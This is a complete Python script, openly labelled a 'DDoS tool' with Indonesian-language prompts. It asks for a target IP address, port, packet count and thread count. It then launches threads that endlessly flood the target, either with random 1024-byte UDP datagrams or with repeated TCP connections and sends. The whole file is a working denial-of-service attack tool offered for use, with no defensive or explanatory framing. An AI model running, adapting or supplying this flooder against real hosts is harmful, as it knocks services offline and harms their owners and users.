#!/usr/bin/env python3
#Code by Vinz Samp
import random
import socket
import threading

print("~~~ DDOS TOOLS BY VINZ SAMP ~~~")
print("~~~ Code and Scripted by VINZ SAMP ~~~")
print("~~~ SUBREK Devilz SAMP ~~~")
print("~~~ SCRIPT DDOS BY VINZ SAMP ~~~")
ip = str(input(" Ip Yang Mau Di DDOS:"))
port = int(input(" Port Yang Mau Di DDOS:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" MENGIRIM KOPI KAPAL API:"))
threads = int(input(" ROKO SURYA YANG DI KIRIM:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NIH PAKET BY VINZ OTW")
		except:
			print("[!] Error NGAB!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" NIH PAKET BY VINZ OTW")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()